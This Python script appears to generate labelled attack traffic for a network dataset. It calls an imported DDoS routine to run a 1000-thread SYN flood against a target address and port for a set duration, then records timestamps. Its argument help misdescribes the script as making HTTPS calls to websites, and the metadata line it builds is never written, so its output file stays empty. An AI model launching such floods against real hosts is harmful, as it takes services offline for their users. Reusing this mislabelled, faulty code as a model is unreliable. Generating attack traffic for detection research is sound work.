import argparse    
import os
import time
from _ddos import actual_main as ddos_main
from dataset.utils import get_output_folder
from gen_utils import convert_sec_to_milli, write_meta_file
parser = argparse.ArgumentParser(description="Create calls to websites via https")
parser.add_argument("--source",help="Source device(used for meta data)",required=True)
parser.add_argument("--target",help="other vm or device to connect to. Will be none since this is to external websites")
parser.add_argument("--duration",help="how long should the script run for in seconds",default=300)
parser.add_argument("--site",help="Specific site to connect to.",default=[])
parser.add_argument("--depth",help="How deep to dive in each site.",default=5)

args = parser.parse_args()
arg_dict = vars(args)
source = arg_dict["source"]
start_ts = int(convert_sec_to_milli(time.time()))
ddos_main(start_ts=start_ts,soc_timout=arg_dict["duration"],threads=1000,port=5000,sleep_time=10,src_ip=False,tgt_ip=arg_dict["target"],synflood_atk=True,faked_ip=False)
end_ts = int(convert_sec_to_milli(time.time()))
meta_line = str.format("{0}:54321,{1}:{4},{2},{3},True",source,arg_dict["target"],start_ts,end_ts,5000)
meta_lines = []
folder_path = os.path.join(get_output_folder(),"temp")
filename = os.path.join(folder_path,str.format("ddos_{0}_{1}.txt",source,end_ts))
write_meta_file(folder_path,filename,meta_lines)
print("ddos attack script is complete")


